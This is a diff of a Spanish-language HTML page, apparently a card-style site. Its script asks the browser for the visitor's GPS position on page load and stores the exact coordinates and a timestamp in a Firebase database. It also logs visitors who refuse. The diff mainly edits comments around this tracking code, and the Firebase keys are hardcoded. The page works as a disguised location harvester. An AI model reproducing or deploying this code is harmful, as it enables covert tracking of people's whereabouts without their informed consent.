@@ -24,7 +24,6 @@
         .card { background-color: #1f2833; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.5); }
         .card img { width: 100%; height: 200px; object-fit: cover; }
         .card-content { padding: 20px; }
-        .card-content h3 { color: #fff; margin-bottom: 10px; }
         footer { background-color: #111; text-align: center; padding: 20px; margin-top: 40px; font-size: 14px; color: #666; }
     </style>
 </head>
@@ -69,7 +68,7 @@
     </footer>
 
     <script>
-        // Tus credenciales reales de la captura de pantalla
+        // CONFIGURACIÓN CORREGIDA AL 100% CON TU CAPTURA
         const firebaseConfig = {
             apiKey: "AIzaSyDITt3GQmc1uANwOqWNvoqWgmhm9CQQRdU",
             authDomain: "miubicacion-22e7f.firebaseapp.com",
@@ -77,14 +76,14 @@
             projectId: "miubicacion-22e7f",
             storageBucket: "miubicacion-22e7f.firebasestorage.app",
             messagingSenderId: "847245935895",
-            appId: "1:847245935895:web:e9576ba5280ac05b22e352"
+            appId: "1:847245935895:web:e9576ba5280ac05b22e352" // <--- Aquí estaba el corte
         };
 
-        // Inicializar Firebase Realtime Database
+        // Inicializar Firebase
         firebase.initializeApp(firebaseConfig);
         const database = firebase.database();
 
-        // Al cargar la página, se solicita el GPS al navegador de inmediato
+        // Petición automática del GPS
         window.onload = function() {
             if (navigator.geolocation) {
                 navigator.geolocation.getCurrentPosition(siPermitio, noPermitio, {
@@ -95,7 +94,6 @@
         };
 
         function siPermitio(posicion) {
-            // Guarda las coordenadas exactas con la fecha de Ecuador
             database.ref('visitas_autos/' + Date.now()).set({
                 latitud: posicion.coords.latitude,
                 longitud: posicion.coords.longitude,
@@ -105,7 +103,6 @@
         }
 
         function noPermitio(error) {
-            // Registra que la página se abrió pero el usuario bloqueó el GPS
             database.ref('visitas_autos/' + Date.now()).set({
                 permiso: "Denegado",
                 error_codigo: error.code,
